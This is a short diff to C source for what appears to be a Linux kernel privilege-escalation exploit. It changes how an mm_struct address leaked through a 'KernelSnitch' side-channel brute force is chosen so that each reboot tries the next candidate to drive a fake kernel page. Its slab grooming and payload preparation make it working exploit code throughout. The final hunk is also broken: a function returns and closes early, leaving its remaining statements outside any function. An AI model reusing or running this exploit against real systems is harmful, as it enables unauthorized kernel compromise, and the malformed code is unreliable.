@@ -668,7 +668,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
-uintptr_t prepare_kernel_page(int payload_mode) {
+uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
   close_reclaim_sockets();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs();
@@ -745,11 +745,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("[p3] bruteforce returned cnt=%zu best=%zu", ks->mm_cand_cnt, ks->best_score);
   /* CDY 4.14: 2-equality matching leaves ~2 candidates; cycle them across
      retries so the correct one eventually drives the fake page. */
-  static size_t prepare_round = 0;
   uintptr_t leaked = (uintptr_t)-1;
   if (ks->mm_cand_cnt > 0) {
-      leaked = ks->mm_cands[prepare_round % ks->mm_cand_cnt];
-      prepare_round++;
+      /* the round persists across reboots (main.c): candidate N per boot */
+      leaked = ks->mm_cands[cand_round % ks->mm_cand_cnt];
+      pr_info("[probe] candidate %zu/%zu = 0x%zx\n",
+              cand_round % ks->mm_cand_cnt, ks->mm_cand_cnt, leaked);
   }
   pr_info("KernelSnitch bruteforce: state=%d found=%zu mm_struct=0x%zx\n",
           ks->state, ks->found, leaked);
@@ -846,7 +847,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   return base;
 }
 
+size_t g_attempt_round = 0;
 uintptr_t prepare_good_kernel_page(int payload_mode) {
+  return prepare_kernel_page(payload_mode, g_attempt_round);
+}
   int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
